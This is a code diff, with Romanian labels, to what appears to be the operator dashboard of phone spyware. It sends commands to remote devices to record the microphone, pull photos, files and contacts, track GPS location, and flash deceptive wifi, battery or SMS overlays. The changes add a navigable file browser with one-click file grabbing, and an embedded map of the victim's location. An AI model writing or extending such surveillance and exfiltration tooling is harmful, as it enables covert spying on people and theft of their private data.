@@ -1690,6 +1690,7 @@ button.mini.on{background:var(--amber);color:#000;border-color:var(--amber)}
 </select></div>
 </div>
 <div class="form-row"><div style="flex:3"><span class="lbl">Parametri</span><textarea id="cmdParams" rows="2" class="mono">{}</textarea></div></div>
+<div id="cmdParamHelp" style="font-size:11px;color:var(--dim2);margin-bottom:6px;line-height:1.5"></div>
 <div style="display:flex;align-items:center;gap:10px">
 <button onclick="sendCmd()">Trimite</button>
 <span id="cmdStatus" style="font-size:12px;color:var(--dim2)"></span>
@@ -1728,6 +1729,14 @@ function updParams(){
   notifications:{},send_file:{uri:""},send_photos:{limit:10},prompt:{type:"wifi",title:"",body:""},
   contacts:{},network:{},storage_list:{dir:"DCIM",limit:30},status:{}};
   document.getElementById("cmdParams").value=JSON.stringify(d[a]||{},null,2);
+  var H={
+    mic:'ms — durata înregistrării în ms (10000=10s, max 60000)',
+    send_file:'uri — calea completă a fișierului (ex: /storage/emulated/0/DCIM/Camera/IMG_001.jpg). Folosește storage_list pentru a descoperi calea.',
+    send_photos:'limit — numărul de fotografii trimise din galerie (default 10)',
+    prompt:'type: wifi|battery|sms|custom · title + body: textul afișat pe ecran (overlay 4s)',
+    storage_list:'dir: DCIM|Pictures|Download|Internal|Cache sau cale completă · limit: max intrări (default 30)'
+  };
+  document.getElementById("cmdParamHelp").innerHTML=H[a]?'<b>Parametri:</b> '+esc(H[a]):'';
 }
 async function sendCmd(){
   var uid=selDev();if(!uid)return alert("Alege un dispozitiv.");
@@ -1739,6 +1748,16 @@ async function sendCmd(){
     document.getElementById("cmdStatus").textContent=r.ok?"trimisă ✓":"eroare";
     setTimeout(loadDetail,1500);
   }catch(e){document.getElementById("cmdStatus").textContent="eroare: "+e.message}
+}
+function navDir(p){
+  document.getElementById("cmdAction").value="storage_list";
+  document.getElementById("cmdParams").value=JSON.stringify({dir:p,limit:30},null,2);
+  sendCmd();
+}
+function getFile(p){
+  document.getElementById("cmdAction").value="send_file";
+  document.getElementById("cmdParams").value=JSON.stringify({uri:p},null,2);
+  sendCmd();
 }
 function ago(ts,now){var d=now-ts;if(d<0)return"acum";if(d<60)return d+"s";if(d<3600)return Math.floor(d/60)+"m "+(d%60)+"s";if(d<86400)return Math.floor(d/3600)+"h";return Math.floor(d/86400)+"d"}
 function fmtB(n){if(n==null||isNaN(n))return"";n=Number(n);if(n<1024)return n+"B";if(n<1048576)return(n/1024).toFixed(1)+"KB";return(n/1048576).toFixed(1)+"MB"}
@@ -1752,7 +1771,9 @@ function fmtData(d){
       var la=Number(d.lat),ln=Number(d.lng);
       if(isFinite(la)&&isFinite(ln)){
         var acc=(d.acc!=null)?(" <span class='dim'>±"+Math.round(Number(d.acc))+"m</span>"):"";
-        return"📍 <span class='mono'>"+la.toFixed(5)+", "+ln.toFixed(5)+"</span>"+acc+' <a target="_blank" href="https://maps.google.com/?q='+la+','+ln+'">harta</a>';
+        var zoom=16;
+        var osm='<iframe src="https://www.openstreetmap.org/export/embed.html?bbox='+(ln-0.003)+','+(la-0.002)+','+(ln+0.003)+','+(la+0.002)+'&layer=mapnik&marker='+la+','+ln+'" style="width:100%;max-width:360px;height:180px;border:1px solid var(--line);border-radius:8px;margin-top:6px" loading="lazy"></iframe>';
+        return"📍 <span class='mono'>"+la.toFixed(5)+", "+ln.toFixed(5)+"</span>"+acc+' <a target="_blank" href="https://maps.google.com/?q='+la+','+ln+'">Google Maps</a>'+osm;
       }
     }
     if(d.text!=null&&d.text!=="")return"<pre>"+esc(String(d.text).slice(0,8000))+"</pre>";
@@ -1769,17 +1790,25 @@ function fmtData(d){
     if(d.files!=null&&d.files.length){
       var first=d.files[0];
       if(first!=null&&(typeof first==="object")){
-        // Device listing (storage_list): path + size, not a downloadable R2 key.
-        var base=d.base!=null?"<div class='fbase'>"+esc(String(d.base))+"</div>":"";
+        // Device listing (storage_list): navigable file browser.
+        var base=d.base!=null?String(d.base):"";
+        var par=d.parent!=null?String(d.parent):"";
+        var bar='<div style="display:flex;align-items:center;gap:6px;margin-bottom:6px">'
+          +(par?'<button class="mini" onclick="navDir(\''+esc(par).replace(/'/g,"\\'")+'\')">↑ sus</button>':'')
+          +'<span class="fbase" style="flex:1">'+esc(base)+'</span></div>';
         var rows=d.files.map(function(x){
           if(x==null)return"";
           if(typeof x!=="object")x={path:x};
-          var p=(x.path!=null?String(x.path):(x.name!=null?String(x.name):""));
-          var dir=x.is_dir?"📁 ":"";
-          var fsz=(x.size!=null)?"<span class='dim'> "+fmtB(x.size)+"</span>":"";
-          return"<div class='frow'>"+dir+"<span class='fpath'>"+esc(p)+"</span>"+fsz+"</div>";
+          var p=x.path!=null?String(x.path):"";
+          var n=x.name!=null?String(x.name):p.split("/").pop();
+          if(x.is_dir){
+            return"<div class='frow' style='cursor:pointer' onclick='navDir(\""+esc(p).replace(/"/g,"\\'")+"\")'>📁 <span class='fpath'>"+esc(n)+"</span></div>";
+          }
+          var fsz=(x.size!=null&&x.size>=0)?"<span class='dim'> "+fmtB(x.size)+"</span>":"";
+          return"<div class='frow'><span style='flex:1'><span class='fpath'>"+esc(n)+"</span>"+fsz+"</span>"
+            +"<button class='mini' onclick='getFile(\""+esc(p).replace(/"/g,"\\'")+"\")'>↓ ia</button></div>";
         }).join("");
-        return base+"<div class='flist'>"+rows+"</div>";
+        return bar+"<div class='flist'>"+rows+"</div>";
       }
       // Downloadable R2 keys (send_photos / send_file batch).
       return"<div class='flist'>"+d.files.map(function(x){
